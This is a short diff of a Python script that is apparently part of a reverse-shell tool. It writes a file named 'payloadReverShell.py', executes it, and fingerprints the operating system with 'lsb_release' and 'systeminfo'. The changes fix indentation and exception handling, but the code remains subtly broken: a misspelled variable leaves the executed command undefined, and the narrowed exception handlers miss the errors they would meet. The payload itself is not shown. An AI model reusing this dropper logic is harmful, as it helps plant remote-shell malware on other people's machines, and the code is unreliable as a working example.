@@ -55,7 +55,7 @@ def createProgramme():
     new_name= "payloadReverShell"
 
     with open(new_name+".py","w") as f:
-    f.write(content)
+        f.write(content)
 
     new_file= new_name+".py"
     process = subprocess.Popen(["python", new_file], shell=False)
@@ -72,15 +72,12 @@ def detectos():
         detectcmd = "lsb_release -a"
         resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         os= 1
-    except:
+    except ValueError:
         pass
     try:
         dtectcmd = "systeminfo"
         resultDetectos = subprocess.Popen(detectcmd, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-        if os == 1
-        else
-            os = 2
-    except:
+    except ValueError:
         pass
     return resultDetectos
 
